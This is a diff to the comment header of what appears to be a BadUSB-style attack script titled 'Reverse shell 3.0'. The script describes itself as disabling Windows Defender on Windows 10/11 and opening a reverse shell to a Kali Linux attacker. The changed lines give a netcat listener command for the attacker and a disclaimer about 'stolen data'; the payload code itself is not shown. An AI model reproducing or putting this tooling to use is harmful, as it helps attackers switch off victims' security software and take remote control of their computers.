@@ -2,10 +2,10 @@
  REM                 Title:    Reverse shell 3.0                                              #                          
  REM                 Description: Disable Windows Defender and make Reverse Shell <WORKING>   #   
  REM                 Props: MajoesQ                                                           #
- REM                  Targets: Windows 10/11                                                  #
- REM                 MajoesQ assumes no responsibility for any damages or stolen data.        #
- REM                 DON'T FORGET TO START LISTENER "nc -lvnp PORT                            #
- REM                  DON'T FORGET TO CHANGE ATACKERS IP AND PORT IN LINE  44                 #                       
+ REM                  Targets: Windows 10/11 Atacker: Kali Linux                              #
+ REM                 MajoesQ assumes no responsibility for any damages or stolen data.        #######################
+ REM                 DON'T FORGET TO START LISTENER "stty raw -echo; (stty size; cat) | nc -lvnp PORT ATACKERS_IP   #                         
+ REM                  DON'T FORGET TO CHANGE ATACKERS IP AND PORT IN LINE  44                 #######################                      
 ###############################################################################################
 REM    ENJOY :}
 REM   This disables Windows Defender
